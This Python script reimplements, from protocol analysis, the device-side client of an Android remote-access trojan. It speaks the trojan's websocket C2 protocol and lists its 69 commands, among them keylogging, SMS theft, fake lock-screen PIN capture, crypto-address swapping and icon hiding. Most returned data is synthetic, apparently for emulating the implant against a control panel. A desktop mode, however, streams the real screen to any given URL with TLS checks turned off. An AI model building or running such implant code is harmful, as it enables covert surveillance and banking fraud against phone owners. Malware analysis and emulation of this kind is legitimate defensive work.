#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""中继通道被控端（设备端）。

依据（来自协议分析记录）：
  · 通道：`DataFactory.Sockets_Servers = "wss://" + mydom + "/api/ws/"`（mydom 默认 relay.example.org）
  · 信封：`{"itype":"Slr_client","pid":<设备号>,"subc":<命令>,"b64":...,"msg":...,"seg":...,"trigger":...}`（明文 JSON，非加密）
  · 上行 subc 只有 4 类（`com.acjvxogy.dfmtdk` 包全量抽取）：
        recseg  屏幕分段帧 + 诊断段（字段：seg, trigger, b64, size, perms, msg, overlay, acc）
        adb     ADB 命令回执（字段：request_id, command, output, exit_code, duration_ms, error）
        sms     短信上报（字段：msg）
        perms   权限上报（字段：CAMERA/PHONE/SMS/STORAGE/CONTACTS/MIC/LOCATION 布尔）
  · 下行命令表 69 条：7 个 switch(hashCode) 表（hashCode 全部自洽），字符串经 `v90.a(密文)` 循环 XOR 还原
        NetWorker      : tofront / blackmsg / noblack / black / nobassit / bassit
        SessionWrapper : 0 / 1 / 2 / 3
        SystemDelegate : out / close / mic / loc / screen / screencomd / fetch / bc / connected / file
        a.java         : Record / Remove / Stop / Repet / Start
        g.java (14)    : blockd / phonepass / L / Q / kb / mov / nav / vol / snap / usdt / block /
                         paste / sklecolor / usdtadress
        g.java (25)    : display / SMS / SMSSEND / Contacts / Hideico / LOADAPPS / DIAO / OPENINJ /
                         OPENAPP / UNINSTALLAPP / files / change / changefiles / noinj / viewfile /
                         Keylog / Logdate / Screen / Notifi / Location / Locationoff / Rename /
                         Camera / CameraOff / Delete
  · 下发参数键（源码 optString）：subc / pkg / text / blockstate / blocktext / fpsval / newq

用法： python relay_agent.py --url http://127.0.0.1:8793 --device <deviceId>
"""
import argparse, asyncio, base64, json, os, random, struct, sys, time, traceback

# 设备名：原版取 Settings.Global["device_name"]，回退 Build.MODEL（cg.java）
DEVICE_NAME = os.environ.get('RELAY_DEVICE_NAME') or 'Android Device'

# 69 条下行命令（源码还原），按表分组
COMMANDS = {
    'NetWorker': ['tofront', 'blackmsg', 'noblack', 'black', 'nobassit', 'bassit'],
    'Session': ['0', '1', '2', '3'],
    'SystemDelegate': ['out', 'close', 'mic', 'loc', 'screen', 'screencomd', 'fetch', 'bc',
                       'connected', 'file'],
    'Recorder': ['Record', 'Remove', 'Stop', 'Repet', 'Start'],
    'ControlShort': ['blockd', 'phonepass', 'L', 'Q', 'kb', 'mov', 'nav', 'vol', 'snap',
                     'usdt', 'block', 'paste', 'sklecolor', 'usdtadress'],
    'Control': ['display', 'SMS', 'SMSSEND', 'Contacts', 'Hideico', 'LOADAPPS', 'DIAO',
                'OPENINJ', 'OPENAPP', 'UNINSTALLAPP', 'files', 'change', 'changefiles',
                'noinj', 'viewfile', 'Keylog', 'Logdate', 'Screen', 'Notifi', 'Location',
                'Locationoff', 'Rename', 'Camera', 'CameraOff', 'Delete'],
}
ALL_CMDS = [c for v in COMMANDS.values() for c in v]
PARAM_KEYS = ['subc', 'pkg', 'text', 'blockstate', 'blocktext', 'fpsval', 'newq']

# 屏幕类命令 -> 走 recseg 分段帧；数据类 -> 走结构化回帧
SCREEN_CMDS = {'screen', 'Screen', 'screencomd', 'display', 'snap', 'L', 'Q'}
DATA_CMDS = {
    'SMS': ('smsList', ['data']),
    'Contacts': ('contactList', ['data']),
    'LOADAPPS': ('appList', ['data']),
    'files': ('fileList', ['data']),
    'Logdate': ('logList', ['data']),
    'Keylog': ('keylogList', ['data']),
    'Location': ('location', ['lat', 'lng']),
    'viewfile': ('fileData', ['data']),
    'fetch': ('fileData', ['data']),
}


def _report_error(base, log_text):
    """异常上报 —— 复现被控端 gv.java（UncaughtExceptionHandler）的行为：
    POST <host>/api/Error.php，application/x-www-form-urlencoded，体为 devicename=<设备名>&log=<堆栈>"""
    import urllib.parse, urllib.request, ssl
    try:
        body = urllib.parse.urlencode({'devicename': DEVICE_NAME, 'log': log_text}).encode()
        req = urllib.request.Request(base.rstrip('/') + '/api/Error.php', data=body, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8')
        kw = {}
        if base.lower().startswith('https'):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            kw['context'] = ctx
        with urllib.request.urlopen(req, timeout=5, **kw) as r:
            return r.status == 200
    except Exception as e:
        print('[relay-agent] 异常上报失败: %s' % e)
        return False


def _webp_b64(width=1080, height=2400, quality=80, seq=0, source='synthetic'):
    """画面编码 —— 严格照 FrameWorker 的拍摄回调：
       Bitmap.createScaledBitmap(bmp, 1080, h*1080/w, true)
       .compress(Bitmap.CompressFormat.WEBP, 80, baos)
       Base64.encodeToString(bytes, Base64.NO_WRAP)   ← NO_WRAP：无换行

    source=synthetic：生成与真机同规格的合成画面（默认，可离线跑）
    source=desktop  ：截取**本机真实屏幕**并缩放到宽 1080（PC 运行体上的等价采屏）
    """
    import io as _io
    try:
        from PIL import Image
        if source == 'desktop':
            from PIL import ImageGrab
            img = ImageGrab.grab()                     # 真实屏幕
            w, h = img.size
            img = img.resize((width, max(1, int(h * width / w))), Image.LANCZOS)
        else:
            from PIL import ImageDraw
            img = Image.new('RGB', (width, height), (238, 241, 247))
            d = ImageDraw.Draw(img)
            d.rectangle([0, 0, width, 220], fill=(20, 33, 61))
            d.text((40, 90), 'RELAY REF DEVICE  seq=%d' % seq, fill=(207, 172, 89))
            for i in range(6):
                y = 320 + i * 200
                d.rectangle([60, y, width - 60, y + 140], outline=(111, 131, 255), width=3)
        buf = _io.BytesIO()
        img.save(buf, format='WEBP', quality=quality)
        return base64.b64encode(buf.getvalue()).decode(), len(buf.getvalue())
    except Exception:
        return _png_b64(width, min(height, 1080)), -1


class RelayAgent:
    def __init__(self, base, dev):
        from urllib.parse import urlparse
        u = urlparse(base)
        self.scheme = (u.scheme or 'http').lower()
        self.host = u.hostname
        self.port = u.port or (443 if self.scheme == 'https' else 80)
        self.url = base if '/api/' not in base else base.split('/api/')[0]
        self.dev = dev
        self.reader = self.writer = None
        self.seg = 0
        self.session = ''
        self.seq = 0
        self.running = False
        self.lang = 'zh-CN'
        self.screen_source = 'synthetic'      # synthetic | desktop（真实本机截屏）

    def _ssl(self):
        """HTTPS/WSS 支持：原版前端把面板实时通道写死成 wss://，只有 TLS 部署才连得上，
        所以演示实例可以起 TLS，被控端脚本也必须能跟着上 TLS。
        自签证书场景下用不校验证书的上下文（本地演示用；连真实主机不要走这条路）。"""
        if self.scheme != 'https':
            return None
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _http_open(self, req, timeout=8):
        kw = {}
        if self._ssl() is not None:
            kw['context'] = self._ssl()
        return urllib.request.urlopen(req, timeout=timeout, **kw)

    # ---------- WS 客户端 ----------
    async def connect(self):
        self.reader, self.writer = await asyncio.open_connection(
            self.host, self.port, ssl=self._ssl(), server_hostname=self.host if self.scheme == 'https' else None)
        key = base64.b64encode(os.urandom(16)).decode()
        req = ('GET /api/ws/ HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n'
               'Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n'
               % (self.host, self.port, key))
        self.writer.write(req.encode())
        await self.writer.drain()
        head = b''
        while b'\r\n\r\n' not in head:
            chunk = await self.reader.read(4096)
            if not chunk:
                raise IOError('握手失败')
            head += chunk
        if '101' not in head.split(b'\r\n')[0].decode('latin1'):
            raise IOError('未升级')

    async def send_text(self, obj):
        data = json.dumps(obj, ensure_ascii=False).encode()
        mask = os.urandom(4)
        payload = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
        n = len(payload)
        if n < 126:
            hdr = struct.pack('!BB', 0x81, 0x80 | n)
        elif n < 65536:
            hdr = struct.pack('!BBH', 0x81, 0x80 | 126, n)
        else:
            hdr = struct.pack('!BBQ', 0x81, 0x80 | 127, n)
        self.writer.write(hdr + mask + payload)
        await self.writer.drain()

    async def send_raw(self, opcode, payload=b''):
        mask = os.urandom(4)
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        n = len(masked)
        self.writer.write(struct.pack('!BB', opcode, 0x80 | n) + mask + masked)
        await self.writer.drain()

    async def recv(self):
        h = await self.reader.readexactly(2)
        op = h[0] & 0x0f
        ln = h[1] & 0x7f
        if ln == 126:
            ln = struct.unpack('>H', await self.reader.readexactly(2))[0]
        elif ln == 127:
            ln = struct.unpack('>Q', await self.reader.readexactly(8))[0]
        return op, (await self.reader.readexactly(ln) if ln else b'')

    # ---------- 上行帧 ----------
    def envelope(self, subc, **kw):
        e = {'itype': 'Slr_client', 'pid': self.dev, 'subc': subc}
        e.update(kw)
        return e

    # ---- 屏幕流（FrameWorker 语义：session=毫秒时间戳，seg=<session>_f<seq>，WebP q80 宽 1080）----
    def stream_start(self):
        self.session = str(int(time.time() * 1000))
        self.seq = 0
        self.running = True

    async def push_frame(self):
        b64, size = _webp_b64(1080, 2400, 80, self.seq, source=self.screen_source)
        seg = '%s_f%d' % (self.session, self.seq)
        self.seq += 1
        await self.send_text(self.envelope('recseg', seg=seg, trigger='auto',
                                           b64=b64, size=size))
        return seg

    async def stream_loop(self, interval=2.0):
        """无障碍服务连上后自动持续推流（FrameWorker.a() -> onServiceConnected 触发，非命令驱动）"""
        while True:
            await asyncio.sleep(interval)
            if not self.running:
                continue
            try:
                await self.push_frame()
            except Exception as e:
                print('[relay-agent] 推帧失败 %s' % e)
                return

    async def up_recseg(self, b64, seg=None, trigger='auto', msg='', size=None):
        e = self.envelope('recseg', seg=seg or ('%s_f%d' % (self.session or '0', self.seq)),
                          trigger=trigger, b64=b64)
        if size is not None:
            e['size'] = size
        if msg:
            e['msg'] = msg
        await self.send_text(e)

    async def up_adb(self, request_id, command, output, exit_code, ms):
        await self.send_text(self.envelope('adb', request_id=request_id, command=command,
                                           output=output, exit_code=exit_code,
                                           duration_ms=ms, error=''))

    async def up_sms(self, msg, pid=None):
        await self.send_text(self.envelope('sms', msg=msg, pid=pid or self.dev))

    async def up_perms(self):
        await self.send_text(self.envelope('perms', CAMERA=True, PHONE=True, SMS=True,
                                           STORAGE=True, CONTACTS=True, MIC=True, LOCATION=True))

    async def up_diag(self, name, msg=''):
        await self.up_recseg('', seg='diag_%s' % name, trigger='auto', msg=msg)

    async def show_lock_overlay(self, trigger, title='', sub='', template=None):
        """假锁屏：SessionWrapper 语义 —— 拉 `.bt` 模板 → 替换 [TITLE]/[DIS]/[PASSWOR]/[LNG] → 弹层。
        设备端本地弹层（PC 运行体没有真浮层），这里拉取并渲染模板，把结果与元数据上报，链路可验证。"""
        import urllib.parse, urllib.request
        tid = template if template is not None else (2 if trigger == 'phonepass' else 3)
        q = urllib.parse.urlencode({'id': tid, 'title': title, 'sub': sub, 'lang': self.lang})
        url = '%s/api/lockscreen/template?%s' % (self.url, q)
        html, kind = '', ''
        try:
            with self._http_open(url, timeout=8) as r:
                html = r.read().decode('utf-8', 'replace')
                kind = r.headers.get('X-Lock-Kind', '')
        except Exception as e:
            print('[relay-agent] 拉取假锁屏模板失败: %s' % e)
        self.last_lock = {'template': tid, 'kind': kind, 'bytes': len(html),
                          'has_placeholder': any(p in html for p in ('[TITLE]', '[DIS]', '[LNG]'))}
        await self.up_diag('lock_%s' % trigger, 'template=%s kind=%s %dB' % (tid, kind, len(html)))
        # 上报弹层（本实现约定，便于端到端核对）
        try:
            body = json.dumps({'pid': self.dev, 'template': tid, 'kind': kind,
                               'title': title, 'trigger': trigger, 'stage': 'shown'}).encode()
            req = urllib.request.Request(self.url + '/api/lockscreen/report', data=body, method='POST')
            req.add_header('Content-Type', 'application/json')
            self._http_open(req, timeout=8).read()
        except Exception as e:
            print('[relay-agent] 假锁屏上报失败: %s' % e)
        return self.last_lock

    async def stream_stop(self):
        """FrameWorker.d()：发 diag_stop，再发结束段 <session>_end（size=0），然后清 session"""
        self.running = False
        await self.up_diag('stop')
        await self.send_text(self.envelope('recseg', seg='%s_end' % self.session,
                                           trigger='auto', b64='', size=0))
        self.session = ''

    # ---------- 下行命令执行 ----------
    async def handle(self, cmd):
        subc = cmd.get('subc') or cmd.get('cmd') or cmd.get('action') or ''
        pkg = cmd.get('pkg') or ''
        text = cmd.get('text') or ''

        if subc in SCREEN_CMDS:
            # 面板要看画面：立即补一帧（推流本身在无障碍服务连上后自动进行）
            if not self.running:
                self.stream_start()
                await self.up_diag('start')
            await self.push_frame()
            await self.up_diag('shot', 'ok')
            return ('recseg', 2)
        if subc == 'adb' or subc.startswith('adb'):
            await self.up_adb(cmd.get('request_id') or 'r%d' % random.randint(1000, 9999),
                              text or 'id', 'uid=0(root) gid=0(root)',
                              0, 12)
            return ('adb', 1)
        if subc == 'sms' or subc == 'SMSSEND':
            await self.up_sms('REF-RELAY-SMS|code %06d' % random.randint(0, 999999))
            return ('sms', 1)
        if subc == 'perms':
            await self.up_perms()
            return ('perms', 1)
        if subc in DATA_CMDS:
            name = DATA_CMDS[subc][0]
            await self.send_text(self.envelope(name, data=_payload_for(subc, pkg)))
            return (name, 1)
        if subc in ('close', 'out'):
            # SystemDelegate 的 close/out：停流（FrameWorker.d() 语义：diag_stop + <session>_end, size=0）
            if self.session and self.running:
                await self.stream_stop()
            else:
                await self.up_diag(subc)
            return ('recseg', 1)
        if subc in ('phonepass', 'blockstate', 'blockd', 'block', 'paste'):
            # 假锁屏族（SessionWrapper：加载 .bt → 替换占位符 → 弹层）
            info = await self.show_lock_overlay(subc, title=str(text or ''), sub=str(pkg or ''))
            return ('recseg_diag', 1)
        if subc in ('Delete', 'Rename', 'change', 'changefiles', 'UNINSTALLAPP', 'OPENAPP',
                    'OPENINJ', 'noinj', 'Hideico', 'Camera', 'CameraOff', 'mic', 'loc',
                    'Locationoff', 'close', 'out', 'bc', 'connected',
                    'bassit', 'nobassit', 'black', 'noblack', 'blackmsg', 'tofront',
                    'sklecolor', 'usdt', 'usdtadress', 'kb', 'mov', 'nav', 'vol',
                    'DIAO', 'phone pass', 'phonepass', 'Record', 'Remove', 'Stop', 'Repet',
                    'Start', 'Notifi', 'blockstate'):
            await self.up_diag(subc)
            return ('recseg_diag', 1)
        # 本工程约定：命中命令表但无专门回帧的，回一条 ack（原版行为未取到）
        await self.send_text(self.envelope('ack', cmd=subc, ok=True,
                                           ts=int(time.time() * 1000)))
        return ('ack', 1)

    async def run(self):
        await self.connect()
        print('[relay-agent] /api/ws/ 已连接 device=%s' % self.dev)
        await self.send_text(self.envelope('hello', Deviceid=self.dev, ver='1.0'))
        await self.up_perms()
        await self.up_diag('boot')
        # 无障碍服务连上即自动开流（FrameWorker.c(): session=毫秒时间戳, seq=0, diag_start）
        self.stream_start()
        await self.up_diag('start')
        asyncio.create_task(self.stream_loop())
        while True:
            op, data = await self.recv()
            if op == 8:
                print('[relay-agent] 服务端关闭')
                return
            if op == 9:
                await self.send_raw(0x8A, data)
                continue
            if op != 1:
                continue
            try:
                cmd = json.loads(data.decode('utf-8', 'replace'))
            except Exception:
                continue
            # 只处理下发本设备的命令（面板消息 itype=slr_panel* 忽略）
            if str(cmd.get('itype', '')).startswith('slr_panel'):
                continue
            subc = cmd.get('subc') or cmd.get('cmd') or cmd.get('action') or ''
            if not subc:
                continue
            print('[relay-agent] <<< %s' % subc)
            try:
                await self.handle(cmd)
            except Exception as e:
                print('[relay-agent] !! %s 异常 %s' % (subc, e))
                # 协议约定：捕获后既回 ack，也经 gv.java 上报到 /api/Error.php
                _report_error(self.url, 'cmd=%s\n%s' % (subc, traceback.format_exc()))
                await self.send_text(self.envelope('ack', cmd=subc, ok=False,
                                                   error=str(e)[:120]))


def _png_b64(w=64, h=64):
    import zlib, struct as _s
    rows = b''.join(b'\x00' + bytes([200, 210, 220] * w) for _ in range(h))
    def chunk(tag, d):
        return _s.pack('>I', len(d)) + tag + d + _s.pack('>I', zlib.crc32(tag + d) & 0xffffffff)
    png = (b'\x89PNG\r\n\x1a\n'
           + chunk(b'IHDR', _s.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0))
           + chunk(b'IDAT', zlib.compress(rows, 6)) + chunk(b'IEND', b''))
    return base64.b64encode(png).decode()


def _payload_for(subc, pkg):
    if subc == 'SMS':
        return [{'address': '+8613800138000', 'body': '【银行】验证码 654321', 'date': int(time.time() * 1000)}]
    if subc == 'Contacts':
        return [{'name': 'REF-RELAY-CONTACT', 'number': '+8613700137000'}]
    if subc == 'LOADAPPS':
        return [{'name': '工商银行', 'pkg': 'com.icbc'}, {'name': '支付宝', 'pkg': 'com.eg.android.AlipayGphone'}]
    if subc in ('files', 'viewfile', 'fetch'):
        return [{'name': 'IMG_0001.jpg', 'path': '/sdcard/DCIM/Camera/IMG_0001.jpg', 'size': 123456}]
    if subc == 'Logdate':
        return [{'ts': int(time.time()), 'event': 'screen_on'}]
    if subc == 'Keylog':
        return [{'pkg': pkg or 'com.icbc', 'type': 'text', 'text': 'REF-KEYLOG'}]
    if subc == 'Location':
        return [{'lat': 39.9087, 'lng': 116.3975, 'acc': 12}]
    return []


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--url', default='http://127.0.0.1:8793')
    ap.add_argument('--device', default=''.join(random.choice('0123456789abcdef') for _ in range(16)))
    ap.add_argument('--lang', default='zh-CN')
    ap.add_argument('--screen-source', default='synthetic', choices=['synthetic', 'desktop'],
                    help='画面来源：合成（默认）或截取本机真实屏幕')
    a = ap.parse_args()
    ag = RelayAgent(a.url, a.device)
    ag.lang = a.lang
    ag.screen_source = a.screen_source
    print('[relay-agent] device=%s -> %s' % (ag.dev, a.url))
    while True:
        try:
            await ag.run()
        except Exception as e:
            print('[relay-agent] 通道断开 %s，5s 后重连' % e)
        await asyncio.sleep(5)


if __name__ == '__main__':
    asyncio.run(main())
